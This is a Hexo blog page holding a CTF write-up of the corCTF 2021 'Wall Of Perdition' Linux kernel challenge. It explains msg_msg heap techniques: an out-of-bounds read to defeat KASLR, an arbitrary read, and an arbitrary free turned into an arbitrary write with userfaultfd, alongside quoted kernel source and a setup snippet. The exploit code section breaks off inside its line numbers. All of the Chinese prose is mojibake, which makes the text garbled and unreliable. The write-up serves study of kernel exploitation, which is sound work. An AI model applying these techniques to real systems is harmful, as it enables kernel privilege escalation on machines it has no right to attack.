<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æˆ‘çš„åšå®¢">
<meta property="og:type" content="website">
<meta property="og:title" content="study">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="æˆ‘çš„åšå®¢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/" class="post-title-link" itemprop="url">corCTF 2021 Wall Of Perdition&msgç¬¬äºŒå¼¹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-11-16 21:18:18 / ä¿®æ”¹æ—¶é—´ï¼š21:19:21" itemprop="dateCreated datePublished" datetime="2022-11-16T21:18:18+08:00">2022-11-16</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>msgåœ¨è®¸å¤šå†…æ ¸cveä¸­éƒ½æœ‰ä½¿ç”¨ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™é“é¢˜å†åŠ æ·±ä¸€ä¸‹å¯¹msgçš„ç†è§£ï¼Œç„¶åçœ‹çœ‹èƒ½ä¸èƒ½å¤ç°ä¸ªå†…æ ¸cveã€‚</p>
<p>è¿™ä¸ªæ˜¯corctf2021å†…æ ¸é¢˜çš„å›°éš¾æ¨¡å¼ï¼Œç®€å•æ¨¡å¼æ˜¯0x1000çš„objectåˆ©ç”¨ï¼Œå›°éš¾æ¨¡å¼æ˜¯0x40çš„objectåˆ©ç”¨ã€‚æ¯”ä¹‹0x1000çš„åˆ©ç”¨ç¡®å®éº»çƒ¦å¾ˆå¤šï¼Œåœ¨0x1000çš„objectåˆ©ç”¨ä¸­ï¼Œå¦‚æœæ§åˆ¶äº†msgçš„å‰0x28ä¸ªå­—èŠ‚çš„è¯ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨msgçš„<code>m_ts</code>å’Œ<code>next</code>å®Œæˆå†…æ ¸åœ°å€çš„æ³„éœ²ä»¥åŠé…åˆ<code>userfault</code>çš„ä»»æ„åœ°å€å†™ã€‚</p>
<p>åœ¨0x40çš„åˆ©ç”¨ä¸­ï¼Œæ³„éœ²åœ°å€å’Œ0x1000å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œä¸»è¦çš„å·®åˆ«å‡ºç°åœ¨äº†ä»»æ„åœ°å€å†™ä¸Šé¢,å…¶ä¸­åˆ©ç”¨msgè¿›è¡Œä»»æ„åœ°å€å†™çš„å†…æ ¸ä»£ç å¦‚ä¸‹,å°±ç®—èƒ½å¤Ÿä¿®æ”¹msg.next,ä½†æ˜¯å†™çš„é•¿åº¦æ—©å·²ç»è¢«è®°å½•åˆ°äº†lenå˜é‡ä¸­ï¼Œæ‰€ä»¥å‘nextå†™å€¼çš„æ—¶å€™ç›¸å½“äºæ‰§è¡Œäº†<code>copy_from_user(seg + 1, src, 0)</code>,å°±æ²¡æœ‰å‘nextä¸­å†™å€¼ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¿™é“é¢˜ç›®çš„ä½œè€…çš„ç ”ç©¶ï¼Œä¾æ—§å‘ç°äº†ä¸€ä¸ªåªåˆ©ç”¨msgè¿›è¡Œä»»æ„å†™çš„æ€è·¯ï¼Œçœ‹å®Œåä¸å¾—ä¸è¯´ä¸€å¥å¥½ç‰›ğŸ˜»ã€‚</p>
<p>åœ¨ç®€å•æ¨¡å¼ä¸­ï¼Œå…¶å®å¿½ç•¥ä¸€ä¸ªmsgçš„åˆ©ç”¨æ–¹å¼ï¼Œé‚£å°±æ˜¯ä»»æ„free,åœ¨msgrev()ä¸­ä¼šæŠŠæ‰¾åˆ°çš„msgä»¥åŠå¯¹åº”çš„æ®µéƒ½ç»™freeæ‰ï¼Œç„¶åæŠŠè¿™ä¸ªmsgä»<code>msg_queue</code>ä¸­è„±é“¾ï¼Œæ‰€ä»¥å¦‚æœèƒ½æ§åˆ¶<code>msg</code>çš„è¯å¯ä»¥æ§åˆ¶nextè®©å…¶æŒ‡å‘ä¸€ä¸ªobjectåœ°å€ï¼Œç„¶åå†<code>msgrcv()</code>,å¦‚æœä¼ªé€ nextåˆç†çš„è¯ï¼Œå°±ä¼šæŠŠnextç»™freeæ‰äº†ï¼Œè¿™å°±æ„æˆäº†ä»»æ„åœ°å€freeçš„æ•ˆæœã€‚</p>
<p>åœ¨å°äº0x1000å°ºå¯¸çš„objectçš„msgåˆ©ç”¨ä¸­ï¼Œå°±æ˜¯å…ˆè¿›è¡Œä»»æ„free,ç„¶åé€šè¿‡ä»»æ„freeæ„é€ å‡ºä»»æ„åœ°å€å†™ï¼Œå…·ä½“æ€è·¯å¦‚ä¸‹</p>
<h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p><strong>1</strong>.é¦–å…ˆæ“ä½œå¦‚ä¸‹ï¼Œç”³è¯·ä¸‰ä¸ªmsg_id,ç„¶åå‘msg_id[0]ç”³è¯·ä¸€ä¸ª0x40å¤§å°çš„msg,è¿™ä¸ªmsgæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå‘msg_id[1]ç”³è¯·ä¸¤ä¸ªmsgï¼Œç¬¬ä¸€ä¸ªå¤§å°æ˜¯0x40,ç¬¬äºŒä¸ªå¤§å°æ˜¯0x2000ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">   msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">   send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1fc8</span>,IPC_NOWAIT);</span><br></pre></td></tr></table></figure>

<p>ç„¶å0x40çš„slabä¸Šå¯èƒ½å‡ºç°çš„æƒ…å†µå¦‚å›¾ï¼Œæ”¹å¤§ä¸Šé¢çš„msgçš„<code>m_ts</code>å°±å¯ä»¥è¶Šç•Œè¯»äº†ï¼Œæœ€ä¸»è¦çš„æ˜¯è¯»åˆ°msg_id[1]çš„0x40çš„msgçš„ll_prev,ll_next,å…¶ä¸­ll_prevæŒ‡å‘äº†msg_id[1]çš„msg_queue,ll_nextæŒ‡å‘äº†msg_id[1]çš„ä¸‹ä¸€ä¸ª0x2000çš„msgï¼Œç„¶åè¿˜å¯ä»¥æ ¹æ®è¿™ä¸ªè¶Šç•Œè¯»æ³„éœ²å†…æ ¸åœ°å€ï¼Œä½†æ˜¯è¿™ä¸ªå†…æ ¸åœ°å€çš„é€‰æ‹©ä¸èƒ½è¢«fg_kaslrå½±å“ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯<code>error_injection_list</code>è¿™ä¸ªæŒ‡å‘å†…æ ¸æ•°æ®æ®µçš„åœ°å€ç®—å‡ºkernelbaseã€‚</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/1.png" alt="debug"></p>
<p> <strong>2</strong>.å†åˆ©ç”¨msg_id[0]çš„msgè¿›è¡Œä»»æ„è¯»ï¼Œè¯»å–å½“å‰è¿›ç¨‹çš„<code>task_struct</code>ï¼Œè¿™ä¸ªå’Œç®€å•æ¨¡å¼ä¸€æ ·å°±ä¸èµ˜è¿°ã€‚</p>
<p><strong>3</strong>.æ„é€ ä»»æ„free,é¦–å…ˆæŠŠmsg_id[1]çš„æ‰€æœ‰msgå…¨éƒ¨é‡Šæ”¾ï¼Œç”±äºè¿™ä¸ªå†…æ ¸æ˜¯slabåˆ†é…ï¼Œä¸”slabæ˜¯åè¿›å…ˆå‡ºçš„ï¼Œåœ¨é‡Šæ”¾0x2000çš„msgçš„æ—¶å€™é¦–å…ˆé‡Šæ”¾msg_msg,ç„¶åå†é‡Šæ”¾ä»–çš„æ®µï¼Œæ‰€ä»¥å½“å†ä½¿ç”¨msg_id[2]ç”³è¯·ä¸€ä¸ª0x2000çš„msgçš„æ—¶å€™ï¼Œä¹‹å‰çš„æ®µå°±è¢«å½“æˆmsg_msg,åŸå…ˆçš„msg_msgå°±è¢«å½“æˆæ®µäº†ï¼Œå†åŠ ä¸Šå¦‚æœç”³è¯·è¿™ä¸ªmsgçš„æ—¶å€™msgsndä¼ å…¥çš„æ˜¯ä¸€ä¸ªuserfaultæ£€æµ‹çš„é¡µï¼Œæ­¤æ—¶å†è®©msg_id[0]çš„msgçš„nextæŒ‡å‘è¿™ä¸ªæ®µå†é‡Šæ”¾è¿™ä¸ªmsg,å°±ä¼šæŠŠåˆšæ‰ç”³è¯·çš„æ®µç»™é‡Šæ”¾æ‰ï¼Œå›¾ç¤ºå¦‚ä¸‹</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/5.png" alt="debug"></p>
<p>å†é‡Šæ”¾</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/9.png" alt="debug"></p>
<p>æ­¤æ—¶å°±ç›¸å½“äºä»»æ„freeäº†ï¼Œä½†æ˜¯freeçš„æ˜¯ä¸ªæ­£åœ¨åˆå§‹åŒ–çš„msgçš„æ®µï¼Œæˆ‘ä»¬éšæ—¶å¯ä»¥å‘è¿™ä¸ªè¢«freeçš„æ®µé‡Œå†™å…¥æ•°æ®ã€‚</p>
<p><strong>4</strong>.ä»»æ„å†™ï¼Œæ­¤æ—¶msg_id[2]çš„msg.nextæŒ‡å‘è¢«freeçš„4Ké¡µï¼Œä¸”èƒ½éšæ—¶å‘è¿™ä¸ªé¡µé¢é‡Œå†™å…¥æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥å†ç”³è¯·ä¸€ä¸ª0x1000-0x30+0x10çš„msgæŠŠè¿™ä¸ªé¡µå†ç”³è¯·å‡ºæ¥å½“æ–°çš„msgçš„msg_msgï¼Œç”³è¯·è¿™ä¸ªé¡µçš„æ—¶å€™ä¼ å…¥çš„ç”¨æˆ·æ€çš„å†…å­˜ä¹Ÿæ˜¯è¢«userfaultæ£€æµ‹çš„ã€‚</p>
<p>åˆ°è¿™é‡Œå°±æœ‰ä¸¤ä¸ªcome_from_user()è¢«å¡ä¸»äº†ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å…ˆè®©çº¢è‰²çš„msgé€šè¿‡ï¼Œè¿™æ ·å°±èƒ½ä¿®æ”¹è“è‰²çš„msg_msgäº†ï¼Œä¿®æ”¹è¿™ä¸ªmsg_msgçš„nextä¸ºä»»æ„åœ°å€ï¼Œç„¶åå†è®©è“è‰²çš„msgé€šè¿‡ï¼Œè¿™æ ·åœ¨åˆå§‹åŒ–è¿™ä¸ªmsgçš„æ®µçš„æ—¶å€™å°±ä¼šå‘ä»»æ„åœ°å€å†™ä»»æ„å†…å®¹äº†ã€‚</p>
<p><img src="https://syst3mfailure.io/assets/images/wall_of_perdition/10.png" alt="debug"></p>
<p>æ„Ÿè§‰è‡ªå·±è®²çš„å¾ˆå¨å±ä¸€æ ·ã€‚ã€‚ã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æ€è·¯æ¯”è¾ƒé¥¶ï¼Œä½†æ€»ç»“æ¥çœ‹æœ€åå®ç°ä»»æ„åœ°å€å†™è¿˜æ˜¯é€šè¿‡æ§åˆ¶ä¸€ä¸ª4Kå¤§å°çš„msg_msgæ¥å®Œæˆçš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span 